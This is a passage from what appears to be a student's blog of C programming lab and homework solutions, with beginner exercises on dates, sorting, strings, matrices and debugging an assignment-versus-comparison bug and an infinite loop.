&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sy2-3">3.sy2-3</h2>
<p>打开C集成开发环境，建立一个sy2-3.cpp文件，编写程序，功能是输入某年某月某日，输出这一天是这一年的第几天。闰年的条件是：能被4整除但不能被100整除，或者能被400整除。运行程序，输入数据（年月日用英文格式“-”连接，如输入：2024-11-12）并检查结果是否正确。例如：</p>
<p>输入：2020-10-1，输出275</p>
<p>输入：2022-10-1，输出：274。</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">year</span>, <span class="built_in">month</span>, <span class="built_in">day</span>;</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">days</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> days_in_month[] = &#123; <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span> &#125;;</span><br><span class="line">    scanf(<span class="string">&quot;%d-%d-%d&quot;</span>, &amp;<span class="built_in">year</span>, &amp;<span class="built_in">month</span>, &amp;<span class="built_in">day</span>);</span><br><span class="line">    <span class="built_in">int</span> is_leap_year = (<span class="built_in">year</span> % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; <span class="built_in">year</span> % <span class="number">100</span> != <span class="number">0</span>) || (<span class="built_in">year</span> % <span class="number">400</span> == <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">if</span> (is_leap_year) &#123;</span><br><span class="line">        days_in_month[<span class="number">1</span>] = <span class="number">29</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">month</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">days</span> += days_in_month[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">days</span> += <span class="built_in">day</span>;</span><br><span class="line">    printf(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">days</span>);</span><br><span class="line"></span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果不会数组可以看下面这种方法</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="type">int</span> <span class="built_in">year</span>, <span class="built_in">month</span>, <span class="built_in">day</span>;</span><br><span class="line">    <span class="type">int</span> days = <span class="number">0</span>;</span><br><span class="line">    <span class="title function_">scanf</span>(<span class="string">&quot;%d-%d-%d&quot;</span>, &amp;<span class="built_in">year</span>, &amp;<span class="built_in">month</span>, &amp;<span class="built_in">day</span>);</span><br><span class="line">    <span class="type">int</span> is_leap_year = (<span class="built_in">year</span> % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; <span class="built_in">year</span> % <span class="number">100</span> != <span class="number">0</span>) || (<span class="built_in">year</span> % <span class="number">400</span> == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="built_in">month</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">switch</span> (i) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">case</span> <span class="number">5</span>: <span class="keyword">case</span> <span class="number">7</span>: <span class="keyword">case</span> <span class="number">8</span>: <span class="keyword">case</span> <span class="number">10</span>: <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                days += <span class="number">31</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">case</span> <span class="number">6</span>: <span class="keyword">case</span> <span class="number">9</span>: <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                days += <span class="number">30</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                days += is_leap_year ? <span class="number">29</span> : <span class="number">28</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    days += <span class="built_in">day</span>;</span><br><span class="line">    <span class="title function_">printf</span>(<span class="string">&quot;%d\n&quot;</span>, days);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sy2-4">4.sy2-4</h2>
<p>打开C集成开发环境，建立一个sy2-4.cpp文件，输入以下程序代码。代码的功能是从键盘输入一个字母，若是“Y”则显示“Exit”，否则显示“Continue”。</p>
<p>#include &lt;stdio.h&gt;</p>
<p>int main()</p>
<p>{</p>
<p>​ char c;</p>
<p>​ c=getchar();</p>
<p>​ if(c=‘Y’)</p>
<p>​ printf(“Exit”);</p>
<p>​ else</p>
<p>​ printf(“Continue”);</p>
<p>​ return 0;</p>
<p>}</p>
<ol type="1">
<li><p>编译运行程序，输入：Y或N，查看输出结果。</p></li>
<li><p>对输出结果进行分析，若实际系统中存在此类问题，可能造成什么后果。</p></li>
<li><p>应对程序如何进行改进，以避免类似问题的发生。</p></li>
<li><p>若输入的字母Y，有可能是小写字母y，那么程序就如何修改。</p></li>
<li></li>
</ol>
<p>无论输入 <code>Y</code> 还是 <code>N</code>，程序都会输出
<code>Exit</code>。</p>
<ol start="2" type="1">
<li></li>
</ol>
<p>代码中的条件 <code>if (c = 'Y')</code>
实际上是赋值操作，而非比较操作，因此 <code>c</code> 被赋值为
<code>Y</code>，并且条件总是为真（非零），导致程序无论输入
<code>Y</code> 还是其他字符，都会输出
<code>Exit</code>。在实际系统中，类似问题可能导致程序逻辑错误，执行错误的操作。误用赋值会导致不可预料的行为，甚至造成安全漏洞。</p>
<ol start="3" type="1">
<li>使用 == 进行比较</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    c = <span class="built_in">getchar</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;Y&#x27;</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Exit\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Continue\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4" type="1">
<li></li>
</ol>
<p>使用逻辑或条件来判断 <code>c</code> 是否等于 <code>Y</code> 或
<code>y</code>，以处理大小写不敏感的输入：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    c = <span class="built_in">getchar</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;Y&#x27;</span> || c == <span class="string">&#x27;y&#x27;</span>) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Exit\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Continue\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="作业五24.11.11">作业五（24.11.11）</h1>
<h2 id="程序文件名zy5-1.cpp">1、【程序文件名】zy5-1.cpp</h2>
<p>【题目描述】.编写一程序，功能是：输入n个整数，按从小到大输出这n个整数（输出时数据之间用一个空格隔开）。其中，n由键盘输入。例如：（第一个数为个数，即n的值）</p>
<p>运行示例1</p>
<p>输入：5 8 9 1 4 3</p>
<p>输出：1 3 4 89</p>
<p>运行示例2</p>
<p>输入：10 4 9 77 12 45 23 34 2 10 55</p>
<p>输出：2 4 9 10 12 23 34 45 55 99</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span> (<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> numbers[n]; </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;numbers[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (numbers[j] &gt; numbers[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="type">int</span> temp = numbers[j];</span><br><span class="line">                numbers[j] = numbers[j + <span class="number">1</span>];</span><br><span class="line">                numbers[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, numbers[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; n - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy5-2.cpp">2、【程序文件名】zy5-2.cpp</h2>
<p>【题目描述】.编程一程序，功能是：输入4*4阶矩阵，输出下三角（含主对角线）的数之和。例如：</p>
<p>输入：</p>
<p>1 2 3 4</p>
<p>5 6 7 8</p>
<p>9 10 11 12</p>
<p>13 14 15 16</p>
<p>输出：100</p>
<figure class="highlight stan"><table><tr><td class="code"><pre><span class="line"><span class="meta">#include &lt;<span class="string">stdio.h</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main() &#123;</span><br><span class="line">    <span class="type">int</span> <span class="type">matrix</span>[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="type">int</span> <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%d&quot;</span>, &amp;<span class="type">matrix</span>[i][j]);</span><br><span class="line">            <span class="keyword">if</span> (j &lt;= i) &#123;</span><br><span class="line">                <span class="built_in">sum</span> += <span class="type">matrix</span>[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">sum</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="编程作业624.11.15">编程作业6（24.11.15）</h1>
<h2 id="程序文件名zy6-1.cpp">1、程序文件名】zy6-1.cpp</h2>
<p>【题目描述】编写一程序，功能是：输入一个字符串，统计其中数字和非数字字符各有多少
个，输出的两个数字用1个空格隔开。例如： 输入：12abc34%6h*，输出：5 6
输入：123abc$，输出：3 4</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>]; </span><br><span class="line">    <span class="type">int</span> dc = <span class="number">0</span>, ndc = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; str[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">            dc++; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ndc++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, dc, ndc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy6-2.cpp">2、程序文件名】zy6-2.cpp</h2>
<p>【题目描述】编写一程序，功能是：输入一个字符串，判断其是否为回文，即对称字符串。
例如： 输入：abcba，输出：YES 输入：abcda，输出：NO
输入：12321，输出：YES</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main() &#123;</span><br><span class="line">    char <span class="keyword">str</span>[<span class="number">100</span>]<span class="comment">;</span></span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">length</span> = <span class="number">0</span>, i<span class="comment">;</span></span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>, <span class="keyword">str</span>)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">str</span>[<span class="keyword">length</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">length</span>++<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span><span class="comment">; i &lt; length / 2; i++) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">str</span>[i] != <span class="keyword">str</span>[<span class="keyword">length</span> - i - <span class="number">1</span>]) &#123;</span><br><span class="line">            printf(<span class="string">&quot;NO\n&quot;</span>)<span class="comment">; </span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;YES\n&quot;</span>)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy6-3.cpp">3、【程序文件名】zy6-3.cpp</h2>
<p>【题目描述】编程一程序，功能是：输入一个字符串，删除其中的数字字符。例如：
输入：abc12d45e，输出：abcde 输入：123ab<span
class="math inline"><em>c</em><em>d</em>4，<em>输</em><em>出</em>：<em>a</em><em>b</em></span>cd</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    <span class="built_in">char</span> <span class="built_in">str</span>[<span class="number">100</span>]; </span><br><span class="line">    <span class="built_in">int</span> i, j = <span class="number">0</span>;</span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>, <span class="built_in">str</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; <span class="built_in">str</span>[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">str</span>[i] &lt; <span class="string">&#x27;0&#x27;</span> || <span class="built_in">str</span>[i] &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">str</span>[j++] = <span class="built_in">str</span>[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">str</span>[j] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    printf(<span class="string">&quot;%s\n&quot;</span>, <span class="built_in">str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy6-4.cpp">4、【程序文件名】zy6-4.cpp</h2>
<p>【题目描述】编程一程序，功能是：输入一个n×n的矩阵（其中n由键盘输入），输出每一
行数中的最大值。输出时每个数据后加一个空格，小数保留两位。例如： 输入：
3</p>
<p>4 5.3 2</p>
<p>7 8 9</p>
<p>11 10 6 输出：5.30 9.00 11.00</p>
<p>输入： 4</p>
<p>1 2 3 4</p>
<p>8 7 6 5</p>
<p>10 11.1 8 3</p>
<p>78 80 85.5 65 输出：4.00 8.00 11.10 85.50</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, i, j;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">double</span> matrix[n][n];</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;matrix[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">double</span> max = matrix[i][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(matrix[i][j] &gt; max) &#123;</span><br><span class="line">                max = matrix[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2f &quot;</span>, max); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="实验课三24.11.17">实验课三（24.11.17）</h1>
<ol start="3" type="1">
<li>打开C集成开发环境，建立一个sy3-3.cpp文件，编写程序，输出如下规律字母图形（本图行数n=6），其中行数n由键盘输入，第1行左侧无空格。</li>
</ol>
<p>输入：6，输出： ABCDEFEDCBA</p>
<p>​ ABCDEDCBA</p>
<p>​ ABCDCBA</p>
<p>​ ABCBA</p>
<p>​ ABA</p>
<p>​ A</p>
<p>​ 输入：3，输出：ABCBA</p>
<p>​ ABA</p>
<p>​ A</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n); </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> ch = <span class="string">&#x27;A&#x27;</span>; ch &lt; <span class="string">&#x27;A&#x27;</span> + (n - i); ch++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ch);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> ch = <span class="string">&#x27;A&#x27;</span> + (n - i - <span class="number">2</span>); ch &gt;= <span class="string">&#x27;A&#x27;</span>; ch--) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ch);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4" type="1">
<li>打开C集成开发环境，建立一个sy3-4.cpp文件，编写程序，计算自然常数e近似值，精度由键盘输入q值控制，输出时显示6位小数。其中计算e公式如下：</li>
</ol>
<p><span
class="math display"><em>e</em> ≈ 1 + 1/1! + 1/2! + 1/3! + 1/4! + ⋯</span></p>
<p>例如：</p>
<p>输入：0.001，输出：2.718254</p>
<p>输入：0.0001，输出：2.718279</p>
<p>输入：0.00001，输出：2.718282</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> e = <span class="number">1.0</span>; </span><br><span class="line">    <span class="type">double</span> t = <span class="number">1.0</span>; </span><br><span class="line">    <span class="type">double</span> q; </span><br><span class="line">    <span class="type">int</span> n = <span class="number">1</span>; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;q);</span><br><span class="line">    <span class="keyword">while</span> (t &gt;= q) &#123;</span><br><span class="line">        t = t / n; </span><br><span class="line">        e += t;      </span><br><span class="line">        n++;         </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.6f\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="5" type="1">
<li>打开C集成开发环境，建立一个sy3-5.cpp文件，输入如下程序代码。编程的本意是：1~100的整数，遇到5的倍数就跳出，否则累加。</li>
</ol>
<p>#include &lt;stdio.h&gt;</p>
<p>int main()</p>
<p>{</p>
<p>​ int i = 1,sum = 0;</p>
<p>​ while (i &lt;= 100)</p>
<p>​ {</p>
<p>​ if(i % 5 == 0)</p>
<p>​ continue;</p>
<p>​ else</p>
<p>​ sum += i;</p>
<p>​ i++;</p>
<p>​ }</p>
<p>​ printf(“sum=%d”,sum);</p>
<p>​ return 0;</p>
<p>}</p>
<p>试分析以上程序可能存在的问题，应如何改进。</p>
<p>程序运行无输入，输出：sum=4000</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">问题分析</span><br><span class="line">代码的逻辑中存在问题在于 <span class="keyword">continue</span> 语句的使用方式。</span><br><span class="line"><span class="keyword">continue</span> 语句会跳过当前循环的剩余部分，并直接开始下一次迭代。然而，在当前程序中，当 <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span>) 条件为真时，程序进入 <span class="keyword">continue</span> 分支，导致循环跳过了 i++ 的更新语句。这会形成死循环（i 始终为当前值），使程序无法跳出。</span><br><span class="line"></span><br><span class="line">问题改进</span><br><span class="line">需要确保无论是否遇到 <span class="number">5</span> 的倍数，变量 i 都能正常递增。改进的方式有以下两种：</span><br></pre></td></tr></table></figure>
<h3 id="改进方式-1在-continue-之前增加-i"><strong>改进方式 1：在
<code>continue</code> 之前增加 <code>i++</code></strong></h3>
<p>将 <code>i++</code> 放在 <code>continue</code>
语句之前，保证在跳过当前迭代之前更新 <code>i</code> 的值：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>, sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            i++;        </span><br><span class="line">            <span class="keyword">continue</span>;   </span><br><span class="line">        &#125;</span><br><span class="line">        sum += i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sum=%d&quot;</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="改进方式-2去掉-continue调整逻辑"><strong>改进方式 2：去掉
<code>continue</code>，调整逻辑</strong></h3>
<p>可以完全去掉
<code>continue</code>，通过增加条件语句的判断来实现同样的效果：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>, sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">5</span> != <span class="number">0</span>) &#123; </span><br><span class="line">            sum += i;     </span><br><span class="line">        &#125;</span><br><span class="line">        i++;             </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sum=%d&quot;</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="编程作业七24.11.20">编程作业七（24.11.20）</h1>
<h2 id="程序文件名zy7-1.cpp">1、【程序文件名】zy7-1.cpp</h2>
<p>【题目描述】编写一程序，功能是：统计单词个数。从键盘上输入一行字符，统计其中有多
少个单词，单词之间用空格隔开。例如： 输入：I am a student，输出：4
输入：C Program，输出：2</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    <span class="built_in">char</span> <span class="built_in">str</span>[<span class="number">1000</span>];</span><br><span class="line">    <span class="built_in">int</span> i = <span class="number">0</span>, w = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> iw = <span class="number">0</span>; </span><br><span class="line">    fgets(<span class="built_in">str</span>, sizeof(<span class="built_in">str</span>), stdin);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">str</span>[i] != <span class="string">&#x27;\0&#x27;</span> &amp;&amp; <span class="built_in">str</span>[i] != <span class="string">&#x27;\n&#x27;</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">str</span>[i] != <span class="string">&#x27; &#x27;</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span> (iw == <span class="number">0</span>) &#123;</span><br><span class="line">                w++; </span><br><span class="line">                iw = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            iw = <span class="number">0</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;%d\n&quot;</span>, w); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy7-2.cpp">2、【程序文件名】zy7-2.cpp</h2>
<p>【题目描述】编写一程序，功能是：输入n个国家名称，使用冒泡法排序从小到大排序后输
出，输出时每个名称间用一个空格隔开，其中n由键盘输入。例如： 输入：5
China France Britain Russia America 输出：America Britain China France
Russia</p>
